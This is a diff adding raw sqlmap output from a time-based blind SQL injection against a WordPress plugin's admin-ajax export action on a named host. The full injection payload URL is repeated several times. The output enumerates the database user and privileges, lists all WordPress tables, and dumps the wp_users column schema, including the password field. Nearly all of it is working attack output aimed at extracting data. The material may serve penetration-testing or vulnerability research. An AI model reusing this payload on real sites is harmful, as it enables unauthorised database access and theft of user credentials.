@@ -1,0 +1,600 @@
+sqlmap identified the following injection point(s) with a total of 1460 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3) AND (SELECT 7265 FROM (SELECT(SLEEP(5)))nDXV)-- Dwwn&type=json
+---
+web server operating system: Linux CentOS 7
+web application technology: Apache 2.4.6, PHP 7.4.29
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+banner: '10.7.3-MariaDB'
+current user: 'wordpressuser@localhost'
+current database: 'wordpress_db'
+hostname: 'teste.cs.tuiasi.ro'
+current user is DBA: False
+database management system users [1]:
+[*] 'wordpressuser'@'localhost'
+
+database management system users privileges:
+[*] %wordpressuser% [1]:
+    privilege: USAGE
+
+database management system users roles:
+[*] %wordpressuser% [1]:
+    role: USAGE
+
+Database: information_schema
+Table: SESSION_STATUS
+[502 entries]
++---------------+----------------+
+| VARIABLE_NAME | VARIABLE_VALUE |
++---------------+----------------+
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| A             | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | \x02           |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | A              |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| \x02          | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| !             | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| \x02          | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| !             | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| A             | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| !             | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| A             | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | !              |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | !              |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | \x02           |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| A             | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | \x02           |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| !             | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| \x02          | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| A             | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| !             | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| !             | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | !              |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| \x02          | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| A             | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | !              |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
+| <blank>       | <blank>        |
++---------------+----------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3) AND (SELECT 7265 FROM (SELECT(SLEEP(5)))nDXV)-- Dwwn&type=json
+---
+web server operating system: Linux CentOS 7
+web application technology: PHP 7.4.29, Apache 2.4.6
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+Database: wordpress_db
+[21 tables]
++-----------------------------+
+| wp_amr_reportcache          |
+| wp_amr_reportcachelogging   |
+| wp_ays_sccp                 |
+| wp_ays_sccp_block_content   |
+| wp_ays_sccp_block_subscribe |
+| wp_ays_sccp_reports         |
+| wp_ays_sccp_settings        |
+| wp_commentmeta              |
+| wp_comments                 |
+| wp_e_events                 |
+| wp_links                    |
+| wp_options                  |
+| wp_postmeta                 |
+| wp_posts                    |
+| wp_term_relationships       |
+| wp_term_taxonomy            |
+| wp_termmeta                 |
+| wp_terms                    |
+| wp_um_metadata              |
+| wp_usermeta                 |
+| wp_users                    |
++-----------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3) AND (SELECT 7265 FROM (SELECT(SLEEP(5)))nDXV)-- Dwwn&type=json
+---
+web server operating system: Linux CentOS 7
+web application technology: Apache 2.4.6, PHP 7.4.29
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+Database: wordpress_db
+Table: wp_users
+[10 columns]
++---------------------+---------------------+
+| Column              | Type                |
++---------------------+---------------------+
+| display_name        | varchar(250)        |
+| ID                  | bigint(20) unsigned |
+| user_activation_key | varchar(255)        |
+| user_email          | varchar(100)        |
+| user_login          | varchar(60)         |
+| user_nicename       | varchar(50)         |
+| user_pass           | varchar(255)        |
+| user_registered     | datetime            |
+| user_status         | int(11)             |
+| user_url            | varchar(100)        |
++---------------------+---------------------+
+
